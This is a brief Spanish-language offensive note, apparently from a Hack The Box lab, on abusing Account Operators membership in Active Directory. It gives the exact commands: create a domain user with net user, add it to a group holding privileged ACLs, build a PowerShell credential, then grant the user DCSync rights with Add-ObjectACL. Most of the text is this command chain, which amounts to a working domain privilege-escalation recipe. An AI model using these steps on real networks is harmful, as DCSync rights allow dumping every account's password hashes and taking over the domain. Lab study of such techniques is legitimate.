Si obtenemos un usuario que es parte del account operators group, podemos aprovecharlo para crear un usuario y agregarlo a cualquier grupo no protegido que tenga ACLs privilegiados.


    net user porota porota1 /add /domain

Luego 

    net group "grupo" porota /add

Luego creamos credenciales para el usuario

    $SecPassword = ConvertTo-SecureString 'porota1' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('htb\porota', $SecPassword)

Si el grupo al que lo agregamos tiene posibilidades de agregar o modificar los ACLs sobre el dominio, podemos darle a nuestro user permisos de DCSync

    Add-ObjectACL -PrincipalIdentity porota -Credential $Cred -Rights DCSync
